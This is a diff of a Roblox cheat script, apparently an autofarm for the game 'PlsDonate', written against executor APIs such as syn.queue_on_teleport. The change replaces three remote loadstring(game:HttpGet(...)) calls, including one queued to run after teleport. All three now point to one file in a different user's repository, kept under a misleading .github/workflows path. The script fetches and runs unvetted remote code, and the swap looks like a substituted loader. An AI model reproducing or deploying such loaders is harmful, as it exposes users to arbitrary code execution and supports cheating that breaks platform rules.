@@ -157,12 +157,12 @@ local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or 
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = HttpService
 if queueonteleport then
-	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua'))()")
+	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Myoosowo/script/refs/heads/main/.github/workflows/blank.lua'))()")
 end
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/UI"))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Myoosowo/script/refs/heads/main/.github/workflows/blank.lua"))()
 local _HIGHLIGHTLOADER
 pcall(function()
-     _HIGHLIGHTLOADER = loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/hl.lib.lua'))()
+     _HIGHLIGHTLOADER = loadstring(game:HttpGet('https://raw.githubusercontent.com/Myoosowo/script/refs/heads/main/.github/workflows/blank.lua'))()
 end)
 function forceServerHop()
 	--local isVip = game:GetService('RobloxReplicatedStorage').GetServerType:InvokeServer()
